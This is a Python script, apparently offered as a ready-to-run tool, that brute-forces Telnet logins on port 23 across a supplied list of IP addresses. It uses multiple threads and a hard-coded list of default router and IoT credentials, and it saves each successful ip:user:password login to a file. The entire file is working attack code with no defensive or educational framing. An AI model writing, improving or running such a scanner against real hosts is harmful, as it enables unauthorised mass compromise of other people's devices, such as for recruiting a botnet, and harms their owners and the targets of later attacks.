import threading
import sys
import os
import time
import socket
from queue import Queue

combo = [
    "root:root", "admin:admin", "root:", "admin:", "default:",
    "User:admin", "guest:12345", "admin:1234", "admin:12345",
    "admin:password", "ubnt:ubnt", "guest:guest", "user:user",
    "default:OxhlwSG8", "default:S2fGqNFs", "admin:smcadmin",
    "sysadm:sysadm", "support:support", "root:default",
    "root:password", "adm:", "bin:", "daemon:",
    "root:cat1029", "admin:cat1029", "admin:123456", "root:antslq"
]

def read_until(sock, expected, timeout=8):
    sock.settimeout(timeout)
    data = b""
    start = time.time()
    try:
        while time.time() - start < timeout:
            part = sock.recv(1024)
            if not part:
                break
            data += part
            if expected.encode() in data:
                return data.decode(errors="ignore")
    except:
        pass
    return data.decode(errors="ignore")

def worker(queue, output_file, lock):
    while not queue.empty():
        ip = queue.get()
        for credentials in combo:
            try:
                username, password = credentials.split(":")
                sock = socket.socket()
                sock.settimeout(5)
                sock.connect((ip, 23))

                banner = read_until(sock, "ogin:")
                if "ogin" in banner.lower():
                    sock.sendall((username + "\n").encode())
                    time.sleep(0.2)
                    banner = read_until(sock, "assword:")
                    if "assword" in banner.lower():
                        sock.sendall((password + "\n").encode())
                        time.sleep(0.4)

                        resp = sock.recv(4096).decode(errors="ignore")
                        if any(sym in resp for sym in ["#", "$", ">", "@", "%"]) and "ONT" not in resp:
                            with lock:
                                with open(output_file, "a") as f:
                                    f.write(f"{ip}:23 {username}:{password}\n")
                                print(f"\033[32m[+]\033[0m {ip}:23 {username}:{password}")
                            sock.close()
                            break
                sock.close()
            except:
                continue
        queue.task_done()

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python {sys.argv[0]} <list.txt> <threads> <output.txt>")
        sys.exit(1)

    ip_list = sys.argv[1]
    thread_count = int(sys.argv[2])
    output_file = sys.argv[3]

    with open(ip_list, "r") as f:
        ips = [line.strip() for line in f if line.strip()]

    queue = Queue()
    for ip in ips:
        queue.put(ip)

    lock = threading.Lock()
    threads = []

    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(queue, output_file, lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
